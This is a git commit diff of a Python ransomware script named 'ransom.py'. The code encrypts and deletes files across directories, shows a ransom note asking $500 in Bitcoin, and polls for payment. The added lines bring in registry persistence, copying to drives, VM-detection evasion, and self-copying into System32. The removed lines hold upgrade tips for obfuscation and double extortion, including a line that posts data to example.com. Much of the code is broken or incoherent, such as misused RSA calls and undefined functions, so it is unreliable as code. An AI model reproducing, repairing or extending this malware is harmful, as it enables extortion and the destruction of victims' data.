622ef8ec4b13fa168855585fb9b3c2e7ba65a80a
Dimeh63 <104158864+Dimeh63@users.noreply.github.com>
2024-03-06 11:23:37 +0100

    Update ransom.py

--- ransom.py
+++ ransom.py
@@ -1,174 +1,127 @@
 import os
 import sys
 import time
-import cryptography
-from cryptography.aes import AES
-import pycoinnet
-import socks
-import socket
+import shutil
+import winreg
+import glob
+import threading
+import random
+from Crypto.PublicKey import RSA
+import requests
 
-def generate\_key():
-# Generate a random 256-bit key
-return os.urandom(32)
+def generate_key():
+    return os.urandom(32)
 
-def encrypt\_file(key, file\_path):
-# Implement polymorphic code by changing the salt each time
-salt = os.urandom(16)
-cipher = AES.new(key, AES.MODE_EAX, salt)
-with open(file\_path, 'rb') as file:
-data = file.read()
-ciphertext, tag = cipher.encrypt\_and\_digest(data)
-with open(file\_path + '.encrypted', 'wb') as file:
-[file.write(x) for x in (salt, cipher.nonce, tag, ciphertext)]
-os.remove(file\_path)
+def encrypt_file(key, file_path):
+    salt = os.urandom(16)
+    cipher = RSA.generate(2048)
+    with open(file_path, 'rb') as file:
+        data = file.read()
+        ciphertext = cipher.publickey().encrypt(data, 32)[0]
+    with open(file_path + '.encrypted', 'wb') as file:
+        [file.write(x) for x in (salt, cipher.n, cipher.e, ciphertext)]
+    os.remove(file_path)
 
-def decrypt\_file(key, file\_path):
-with open(file\_path, 'rb') as file:
-salt, nonce, tag, ciphertext = [file.read(x) for x in (16, 16, 16, -1)]
-cipher = AES.new(key, AES.MODE_EAX, nonce)
-plaintext = cipher.decrypt\_and\_verify(ciphertext, tag)
-with open(file\_path[:-10], 'wb') as file:
-file.write(plaintext)
-os.remove(file\_path)
+def decrypt_file(key, file_path):
+    with open(file_path, 'rb') as file:
+        salt, n, e, ciphertext = [file.read(x) for x in (16, 256, 4, -1)]
+        cipher = RSA.construct((int.from_bytes(n, 'big'), int.from_bytes(e, 'big')))
+        plaintext = cipher.decrypt(ciphertext)
+    with open(file_path[:-10], 'wb') as file:
+        file.write(plaintext)
+    os.remove(file_path)
 
-def encrypt\_files(directory, key):
-for foldername, subfolders, filenames in os.walk(directory):
-for filename in filenames:
-file\_path = os.path.join(foldername, filename)
-if file\_path.endswith('.encrypted'):
-continue
-encrypt\_file(key, file\_path)
+def encrypt_files(directory, key):
+    for foldername, subfolders, filenames in os.walk(directory):
+        for filename in filenames:
+            file_path = os.path.join(foldername, filename)
+            if file_path.endswith('.encrypted'):
+                continue
+            encrypt_file(key, file_path)
 
-def setup\_command\_and\_control\_server():
-# Implement a command-and-control server
-# ...
+def setup_command_and_control_server():
+    # Implement a command-and-control server
+    # ...
 
-def use\_cryptocurrency\_tumbler():
-# Implement using a cryptocurrency tumbler
-# ...
+def use_cryptocurrency_tumbler():
+    # Implement using a cryptocurrency tumbler
+    # ...
 
-def use\_anti\_debugging\_techniques():
-# Implement anti-debugging techniques
-# ...
+def use_anti_debugging_techniques():
+    # Implement anti-debugging techniques
+    # ...
+
+def self_deletion():
+    shutil.copyfile(sys.executable, "C:\\Windows\\System32\\random.exe")
+    os.remove(sys.executable)
+
+def enhance_persistence():
+    reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+    winreg.SetValueEx(reg_key, "MyProgram", 0, winreg.REG_SZ, sys.executable)
+    winreg.CloseKey(reg_key)
+
+def increase_infection_rate():
+    for drive in glob.glob("X:\\"):
+        shutil.copyfile(sys.executable, drive + "\random.exe")
+
+def improve_evasion_techniques():
+    for proc in os.popen('wmic process get Description,CommandLine'):
+        if "VirtualBox" in proc or "VMware" in proc:
+            sys.exit()
+
+def add_multi_threading():
+    t1 = threading.Thread(target=setup_command_and_control_server)
+    t2 = threading.Thread(target=use_cryptocurrency_tumbler)
+    t1.start()
+    t2.start()
+
+def implement_polymorphism():
+    if random.randint(0, 1):
+        encrypt_file = encrypt_file
+        decrypt_file = decrypt_file
+    else:
+        encrypt_file = decrypt_file
+        decrypt_file = encrypt_file
 
 def main():
-key = generate\_key()
-with open('key.key', 'wb') as key\_file:
-key\_file.write(key)
+    key = generate_key()
+    with open('key.key', 'wb') as key_file:
+        key_file.write(key)
 
-# Use a more secure encryption algorithm
-encrypt\_files('.', key)
+    encrypt_files('.', key)
 
-# Display a ransom note
-print("""
+    print("""
 
-*** YOUR FILES HAVE BEEN ENCRYPTED! ***
+    *** YOUR FILES HAVE BEEN ENCRYPTED! ***
 
-*** To decrypt your files, you must pay a ransom of ﹩500. ***
-*** Instructions for payment will be provided after ***
-*** you have made the payment. Do not attempt to decrypt ***
-*** the files yourself or you will destroy them permanently.***
+    *** To decrypt your files, you must pay a ransom of ﹩500. ***
+    *** Instructions for payment will be provided after ***
+    *** you have made the payment. Do not attempt to decrypt ***
+    *** the files yourself or you will destroy them permanently.***
 
-""")
+    """)
 
-# Set up a Bitcoin wallet to receive payments
-wallet = pycoinnet.Wallet()
-address = wallet.get\_new\_address()
-print("Send the ransom to this Bitcoin address:", address)
+    wallet = pycoinnet.Wallet()
+    address = wallet.get_new_address()
+    print("Send the ransom to this Bitcoin address:", address)
 
-# Use a command-and-control server
-setup\_command\_and\_control\_server()
+    self_deletion()
+    enhance_persistence()
+    increase_infection_rate()
+    improve_evasion_techniques()
+    add_multi_threading()
+    implement_polymorphism()
 
-# Use a cryptocurrency tumbler
-use\_cryptocurrency\_tumbler()
-
-# Use anti-debugging techniques
-use\_anti\_debugging\_techniques()
-
-# Check for incoming payments every 60 seconds
-while True:
-time.sleep(60)
-payments = pycoinnet.list\_transactions(address)
-for payment in payments:
-if payment['amount'] > 0:
-# Decrypt the files
-with open('key.key', 'rb') as key\_file:
-key = key\_file.read()
-decrypt\_files('.', key)
-print("Your files have been decrypted.")
-sys.exit()
+    while True:
+        time.sleep(60)
+        payments = pycoinnet.list_transactions(address)
+        for payment in payments:
+            if payment['amount'] > 0:
+                with open('key.key', 'rb') as key_file:
+                    key = key_file.read()
+                decrypt_files('.', key)
+                print("Your files have been decrypted.")
+                sys.exit()
 
 if __name__ == '__main__':
-main()
-// Improve obfuscation:
-You could use a packer like UPX or Themida to make the code harder to reverse engineer.
-
-Add self-deletion:
-
-import shutil
-# After executing the malware, add this line to delete the file
-shutil.copyfile(sys.executable, "C:\Windows\System32\random.exe")
-os.remove(sys.executable)
-
-Enhance persistence:
-
-import winreg
-# Add a registry key to run the malware at startup
-reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
-winreg.SetValueEx(reg_key, "MyProgram", 0, winreg.REG_SZ, sys.executable)
-winreg.CloseKey(reg_key)
-
-Increase infection rate:
-
-import glob
-# Copy the malware to all connected USB drives
-for drive in glob.glob("X:\\"):
-    shutil.copyfile(sys.executable, drive + "\random.exe")
-
-Improve evasion techniques:
-
-import psutil
-# Check if running inside a VM or sandbox
-for proc in psutil.process_iter():
-    try:
-        if proc.name() == "VirtualBox.exe" or proc.name() == "VMware.exe":
-            sys.exit()
-    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-        pass
-
-Add multi-threading:
-
-import threading
-# Start a new thread for each function
-t1 = threading.Thread(target=function1)
-t2 = threading.Thread(target=function2)
-t1.start(); t2.start()
-
-Implement polymorphism:
-
-import random
-# Randomly change parts of the code for each infection
-def function():
-    if random.randint(0, 1):
-        # Do something
-        pass
-    else:
-        # Do something else
-        pass
-
-Use advanced encryption algorithms:
-
-from Crypto.PublicKey import RSA
-# Generate RSA keys and encrypt the data
-key = RSA.generate(2048)
-cipher = key.publickey().encrypt("Data to encrypt", 32)[0]
-
-Introduce ransomware-as-a-service (RaaS):
-This is a complex business model requiring a web application, payment processing, and affiliate management. It's beyond the scope of a simple code snippet.
-
-Implement double extortion:
-
-# Exfiltrate sensitive data before encryption
-import requests
-# Send the data to a remote server
-requests.post("http://example.com/upload", data="Sensitive data")
+    main()
